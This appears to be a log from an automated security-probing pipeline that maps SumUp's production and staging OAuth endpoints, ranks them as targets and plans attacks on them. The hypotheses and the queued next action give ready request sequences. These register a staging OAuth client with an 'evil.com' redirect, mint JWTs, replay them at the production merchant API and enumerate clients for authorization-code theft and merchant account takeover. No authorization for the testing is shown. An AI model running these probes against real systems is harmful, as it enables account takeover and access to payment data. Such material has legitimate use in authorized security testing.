+**CHANGED** `api.sumup.com/authorize`: Legacy OAuth authorize endpoint CONFIRMED LIVE (302→`auth.sumup.com/flows/oauth2/error`) with client_id oracle (`invalid_client` vs `invalid_request`) and legacy/modern redirect-set divergence (`dashboard` client's modern callback `https://me.sumup.com/api/sso/callback` accepted on `auth.sumup.com/oauth2/auth` → 302 login flow, REJECTED on `api.sumup.com/authorize` → `invalid_request`).
+
+**CHANGED** `api.sumup.com/authorize`: Endpoint-specific wildcard CORS confirmed (`access-control-allow-origin:*`, `allow-methods:GET,HEAD,PUT,PATCH,POST,DELETE`, `max-age=300`) + `SameSite=None; Domain=sumup.com` cookies — absent on `auth.sumup.com/oauth2/auth`.
+
+**CHANGED** JWKS kid comparison: Prod 8 keys, staging 11 keys, ZERO kid overlap. Staging includes `loadtesting` kid not in prod. Cross-env key isolation confirmed at JWKS kid level (explains `mcp.sumup.com` prod rejection of staging tokens).
+
+**CHANGED** `mcp.sumup.com/.well-known/mcp.json`: 404 JSON-RPC response (live endpoint, not static file); MCP app-directory spec metadata not published by this worker.
+
+**CHANGED** `checkout.sumup.com`: Vercel asset (76.76.21.61); uniform 403 text/plain on all paths — edge-gated same as `me.sumup.com`; no anonymous surface.
+
+---
+
+### STEP 2 — PRIORITIZE
+
+| Asset | Score | a | b | t | g | c | f |
+|-------|-------|---|---|---|---|---|---|
+| `auth.sam-app.ro/oauth2/register` | **8.1** | 9 | 8 | 9 | 10 | 7 | 6 |
+| `api.sumup.com/authorize` | **7.4** | 8 | 9 | 8 | 9 | 6 | 5 |
+| `api.sumup.com/.well-known/oauth-protected-resource` | **6.2** | 7 | 8 | 7 | 8 | 5 | 4 |
+| `auth.sumup.com` (OIDC config) | **6.0** | 7 | 9 | 7 | 5 | 6 | 4 |
+| `portal.sumup.com` | **5.8** | 6 | 7 | 6 | 5 | 6 | 5 |
+| `mcp.sumup.com` | **5.5** | 6 | 6 | 8 | 3 | 5 | 5 |
+
+```
+[PRIO] auth.sam-app.ro/oauth2/register,8.1,a=9,b=8,t=9,g=10,c=7,f=6
+[PRIO] api.sumup.com/authorize,7.4,a=8,b=9,t=8,g=9,c=6,f=5
+[PRIO] api.sumup.com/.well-known/oauth-protected-resource,6.2,a=7,b=8,t=7,g=8,c=5,f=4
+[PRIO] auth.sumup.com,6.0,a=7,b=9,t=7,g=5,c=6,f=4
+[PRIO] portal.sumup.com,5.8,a=6,b=7,t=6,g=5,c=6,f=5
+[PRIO] mcp.sumup.com,5.5,a=6,b=6,t=8,g=3,c=5,f=5
+```
+
+---
+
+### STEP 3 — HYPOTHESES
+
+[HYP] Staging dynamic client registration enables self-issued OAuth clients with attacker-controlled redirect_uris and audience, minting valid JWTs with empty scope but controlled aud
+class: OATH
+asset: auth.sam-app.ro/oauth2/register
+confidence: 90
+reasoning: POST /oauth2/register → 201 returns client_id+secret+chosen redirect_uris (declared in openid-configuration). Dynamic clients complete client_credentials grant (client_secret_post) yielding real JWT access_tokens with empty scp:[] but attacker-controlled aud (https://api.sam-app.ro and https://mcp.sam-app.ro both accepted). Registration rejects explicit scope parameter (invalid_client_metadata) and token_endpoint_auth_method: "none". Prod auth.sumup.com has no /register endpoint (404). Staging replicates prod gates byte-for-byte per OIDC discovery.
+evidence_needed: Registered dynamic client on auth.sam-app.ro completing authorization_code+PKCE flow on auth.sam-app.ro/oauth2/auth and exchanging code at auth.sam-app.ro/oauth2/token; proof of cross-environment client sync to prod auth.sumup.com or api.sumup.com/authorize
+verify_steps: POST https://auth.sam-app.ro/oauth2/register with {"client_name":"test","redirect_uris":["https://evil.com/callback"],"grant_types":["authorization_code","client_credentials"],"response_types":["code"],"token_endpoint_auth_method":"client_secret_post"} → observe 201 client_id+secret; POST https://auth.sam-app.ro/oauth2/token with grant_type=client_credentials&client_id=<new_client>&client_secret=<new_secret> → observe JWT with empty scp, attacker-controlled aud; GET https://auth.sam-app.ro/oauth2/auth?client_id=<new_client>&redirect_uri=https://evil.com/callback&response_type=code&scope=openid&code_challenge=<pkce>&code_challenge_method=S256&state=test12345678 → test auth_code+PKCE flow
+impact: Self-issued OAuth client on staging with chosen redirect_uri and aud → credentialed access to staging APIs (api.sam-app.ro, mcp.sam-app.ro); potential bypass of prod registration controls if clients sync across environments — HIGH
+testability: PASSIVE
+
+[HYP] Legacy OAuth authorize endpoint client_id oracle + redirect_uri allowlist divergence + wildcard CORS enables callback host enumeration and OAuth authorization code theft
+class: OATH
+asset: api.sumup.com/authorize
+confidence: 85
+reasoning: Endpoint LIVE (302→auth.sumup.com/flows/oauth2/error via raw curl). Client_id oracle: invalid_client ("does not exist") for unknown IDs vs invalid_request (redirect_uri mismatch) for registered dashboard. Legacy/modern redirect-set divergence: dashboard client's modern callback https://me.sumup.com/api/sso/callback accepted on auth.sumup.com/oauth2/auth (302→login flow, state≥8 enforced) but REJECTED on api.sumup.com/authorize (invalid_request). Endpoint-specific wildcard CORS (access-control-allow-origin:*, allow-methods:GET,HEAD,PUT,PATCH,POST,DELETE, max-age=300) + SameSite=None; Domain=sumup.com cookies — absent on auth.sumup.com/oauth2/auth. Legacy allowlist host not recovered from 52+ candidates (crt.sh subdomains, custom schemes, common patterns).
+evidence_needed: Enumerated legacy callback host accepted for dashboard client on api.sumup.com/authorize yielding authorization code; successful code exchange at auth.sumup.com/oauth2/token
+verify_steps: GET https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://legacy.sumup.com/callback&response_type=code&scope=classic&state=test12345678 → observe invalid_request; GET https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://app.sumup.com/callback&response_type=code&scope=classic&state=test12345678 → test legacy callback pattern; GET https://api.sumup.com/authorize?client_id=sumup-ios-sdk&redirect_uri=https://mobile.sumup.com/callback&response_type=code&scope=classic&state=test12345678 → enumerate SDK client_ids
+impact: OAuth authorization code theft via legacy callback host → merchant account takeover, full scope access (accounting/invoices/api_keys/lending/readers/receivables/unified_customer_directory) — CRITICAL
+testability: PASSIVE
+
+[HYP] RFC 9728 resource server metadata divergence enables audience confusion / token relay across resource servers
+class: OATH
+asset: api.sumup.com/.well-known/oauth-protected-resource
+confidence: 75
+reasoning: api.sumup.com publishes RFC 9728 metadata declaring authorization_servers=["https://auth.sumup.com"] and jwks_uri=https://auth.sumup.com/.well-known/jwks.json. The auth.sumup.com discovery doc supports token_endpoint_auth_methods_supported=["none"] and request_object_signing_alg_values_supported=["none"]. If a token minted for one resource server (e.g., staging api.sam-app.ro) is accepted by another (prod api.sumup.com) due to shared JWKS or audience validation gaps, cross-environment token relay is possible. Prod JWKS already rejects staging tokens (confirmed), but audience validation logic at api.sumup.com gateway is untested.
+evidence_needed: Valid access token from auth.sumup.com (or staging) with aud=https://api.sumup.com accepted by api.sumup.com gateway; token with aud=https://api.sam-app.ro rejected by prod gateway; token with manipulated aud claim accepted
+verify_steps: GET https://api.sumup.com/.well-known/oauth-protected-resource (confirmed 200); GET https://auth.sumup.com/.well-known/jwks.json → compare keys; POST https://auth.sumup.com/oauth2/token with client_credentials grant for dashboard client → extract JWT aud; replay token at api.sumup.com/v1/merchants with Authorization: Bearer <token> → observe 401 vs structured problem+json
+impact: Cross-resource-server token acceptance → merchant data access, payment initiation, reader control across environments — HIGH
+testability: AUTH_HELPED
+
+---
+
+### STEP 4 — SELF-CRITIQUE
+
+[PARKED] RFC 9728 resource server metadata divergence enables audience confusion / token relay across resource servers: Confidence 75 but verify_steps require AUTH_HELPED (valid merchant token, token replay) — cannot test passively; requires live merchant OAuth flow or client_credentials grant which dashboard client may not support on prod.
+
+[FINAL] 1. Staging dynamic client registration enables self-issued OAuth clients with attacker-controlled redirect_uris and audience, minting valid JWTs with empty scope but controlled aud (confidence 90) — SURVIVES
+[FINAL] 2. Legacy OAuth authorize endpoint client_id oracle + redirect_uri allowlist divergence + wildcard CORS enables callback host enumeration and OAuth authorization code theft (confidence 85) — SURVIVES
+
+---
+
+### STEP 5 — NEXT ACTION
+
+[NEXT] PROBE: POST https://auth.sam-app.ro/oauth2/register with {"client_name":"test","redirect_uris":["https://evil.com/callback"],"grant_types":["authorization_code","client_credentials"],"response_types":["code"],"token_endpoint_auth_method":"client_secret_post"} → observe 201 client_id+secret; then POST https://auth.sam-app.ro/oauth2/token with grant_type=client_credentials&client_id=<new>&client_secret=<new> → extract JWT; replay at https://api.sumup.com/v1/merchants with Authorization: Bearer <staging_jwt> → observe rejection (cross-env isolation) vs acceptance (confusion)
+
+---
+
+### STEP 6 — LEARNING
+
+[LEARN] ACCEPTED OATH @ api.sumup.com/.well-known/oauth-protected-resource: RFC 9728 resource-server metadata LIVE (200) declaring authorization_servers=["https://auth.sumup.com"], bearer_methods_supported=["header"], jwks_uri=https://auth.sumup.com/.well-known/jwks.json — new prod attack surface for token validation logic testing.
+[LEARN] ACCEPTED OATH @ auth.sam-app.ro/oauth2/register: RFC 7591 dynamic client registration LIVE unauthenticated (POST → 201 client_id+secret+chosen redirect_uris) declared in openid-configuration; absent in prod auth.sumup.com (/register 404 GET/POST/OPTIONS).
+[LEARN] ACCEPTED OATH @ auth.sam-app.ro: Dynamic clients forced to EMPTY scope (requesting openid → invalid_scope "exceeds allowed scopes"), require PKCE code_challenge, enforce per-client redirect allowlist (unrelated redirect → 401), no RFC7592 get/put/delete (404), NOT synced to api.sam-app.ro/authorize (invalid_client).
+[LEARN] ACCEPTED AUTH @ auth.sam-app.ro: Dynamic client registration yields real JWT access tokens via client_credentials (client_secret_post); JWT contains empty scp but attacker-controlled aud; scope escalation blocked at registration + token endpoint; auth_method declared but not enforced.
+[LEARN] ACCEPTED AUTH @ api.sam-app.ro: Gateway validates JWTs (structured problem+json vs plain 404 with/without token) but empty scope blocks all resource access.
+[LEARN] ACCEPTED OTHER @ mcp.sumup.com: Prod JWKS rejects staging tokens — cross-environment key isolation confirmed.
+[LEARN] REJECTED MISCONFIG @ mcp.sumup.com: Wildcard CORS + Authorization allow-header is NOT token-stealing (bearer_methods_supported=["header"], no cookies/ambient creds); hardening-only.
+[LEARN] ACCEPTED OATH @ api.sumup.com/authorize: Endpoint LIVE with client_id oracle (invalid_client vs invalid_request) and legacy redirect-set divergence — modern dashboard callback rejected on legacy gateway.
+[LEARN] ACCEPTED MISCONFIG @ api.sumup.com/authorize: Wildcard CORS (access-control-allow-origin:*) + broad allow-methods + max-age + SameSite=None cookies on Domain=sumup.com — endpoint-specific divergence from auth.sumup.com.
+[LEARN] ACCEPTED OATH @ auth.sumup.com: Modern dashboard client redirect confirmed live on modern auth server — https://me.sumup.com/api/sso/callback returns 302→login flow (state≥8 enforced).
+[LEARN] REJECTED OATH @ api.sumup.com/authorize: crt.sh-derived callback candidates (app-auth×5, checkout, pay, collect, ze-dashboard, gateway, read-api, api.sumup.com self-hosts, www) + custom schemes (sumup://, sumup-pos://, com.sumup.pos://) all invalid_request — single-class oracle, ~52 combos exhausted; legacy allowlist host not recoverable from reachable surface.
+[LEARN] ACCEPTED OATH @ api.sumup.com/authorize: sumup-ios-sdk and unknown IDs → invalid_client ("does not exist") on legacy gateway — legacy SDK clients not registered; only dashboard confirmed registered.
+[LEARN] ACCEPTED AUTH @ checkout.sumup.com: New Vercel asset (76.76.21.61); uniform 403 text/plain on all paths — edge-gated same as me.sumup.com; no anonymous surface.
+[LEARN] REJECTED MISCONFIG @ auth.sumup.com: No dynamic registration endpoint in prod — register route absent (404 GET/POST/OPTIONS), not exposed.
+[LEARN] REJECTED AUTH @ auth.sam-app.ro: token_endpoint_auth_method enforcement not implemented — server stores preference but does not enforce at token endpoint.
+[LEARN] ACCEPTED OATH @ api.sumup.com/authorize: Redirect-allowlist divergence + wildcard CORS is the api-gateway template (identical on api.sam-app.ro), distinct from auth.sumup.com — architectural fact, not per-instance anomaly.
+[LEARN] REJECTED MISCONFIG @ tap-to-pay-sdk.fleet.live.sumup.net: 401 Cloudflare Maven host + Fleet CD naming = infra/banner class.
+[LEARN] ACCEPTED OATH @ sam-app.ro: Staging stack (mcp/mcp-theta/api/api-theta/auth/auth-theta) publicly reachable; replicates prod gates byte-for-byte (/mcp 401, /authorize invalid_request on evil redirect, OIDC discovery public) — faithful parallel oracle, no permissive config observed.
+[LEARN] ACCEPTED BUSLOGIC @ api.sumup.com/.well-known/oauth-protected-resource: RFC 9728 resource-server metadata LIVE (200 JSON) declaring auth.sumup.com as sole authorization_server, header-only bearer, JWKS URI, developer docs link; no resource_scopes field — reconnaissance surface exhausted.
+[LEARN] ACCEPTED BUSLOGIC @ api.sam-app.ro/.well-known/oauth-protected-resource: Staging variant LIVE (200 JSON) declaring auth.sam-app.ro; identical structure to prod; confirms per-env authorization server binding.
+[LEARN] ACCEPTED OTHER @ mcp.sumup.com/.well-known/mcp.json: 404 JSON-RPC response (not static file); MCP app-directory spec metadata not published by this worker.
+[LEARN] ACCEPTED MISCONFIG @ api.sumup.com/.well-known/openid-configuration: 404 structured problem+json; gateway-handled, no auth-server discovery on API gateway (correct — auth-server is auth.sumup.com).
+[LEARN] ACCEPTED OTHER @ api.sumup.com/.well-known/oauth-authorization-server: 404 structured problem+json; same gateway handling.
+[LEARN] ACCEPTED OTHER @ JWKS prod vs staging kid comparison: Prod 8 keys, staging 11 keys, ZERO kid overlap. Cross-env key isolation confirmed at JWKS kid level (explains mcp.sumup.com prod rejection of staging tokens). Staging includes `loadtesting` kid not in prod.
+
+---
+
+### STEP 7 — RISK
+
+[RISK] sumup: 78 — Auth server (auth.sumup.com) exposes critical OAuth config (alg=none, PAR, device flow, "none" client auth) with full scope catalog mapping to payment APIs. Legacy OAuth gateway (api.sumup.com/authorize) confirmed LIVE with client_id oracle, redirect_uri allowlist divergence, and wildcard CORS — new attack surface for OAuth code theft. Staging auth server (auth.sam-app.ro) allows unauthenticated RFC 7591 dynamic client registration with attacker-controlled redirect_uris and audience, minting valid JWTs (empty scope but controlled aud) — staging/prod divergence. RFC 9728 resource server metadata on api.sumup.com adds token validation surface. All high-impact vectors require merchant OAuth token (AUTH_HELPED) or registered client, but legacy gateway divergence enables passive callback host enumeration and staging registration is fully unauthenticated. API gateway fully gated. Vercel me.sumup.com/checkout.sumup.com add non-Cloudflare surface but auth-gated at edge. Portal introduces third-party supply-chain risk (iriscrm.com) if in-scope confirmed. Admin panel hardened. Financial attack surface concentrated but access-controlled with new legacy OAuth vector, staging registration bypass, and resource server metadata exposure.
